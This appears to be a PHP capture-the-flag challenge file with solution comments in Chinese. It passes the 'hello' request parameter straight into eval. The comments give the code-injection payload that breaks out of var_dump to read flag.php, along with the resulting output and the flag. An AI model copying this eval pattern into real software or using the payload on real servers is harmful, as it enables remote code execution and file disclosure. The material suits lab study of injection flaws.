<?php 

/* flag.php
<?php
	$flag = 'Too Young Too Simple';
  	# echo $flag;
  	# flag{bug-ctf-gg-99};
?>
*/

//http://127.0.0.1/eval.php?hello=);print_r(flag("./flag.php"));//

//构造?hello=);print_r(flag("./flag.php"));//
  
/*	输出
Array ( 
	[0] => $flag = 'Too Young Too Simple'; 
	[2] => # echo $flag; 
	[3] => # flag{bug-ctf-gg-99}; 
	[4] => ?> ) <?php 
*/
	include "waf.php"; 
    $a = @$_REQUEST['hello']; 
    eval( "var_dump($a);"); 
    show_source(__FILE__); 
?> 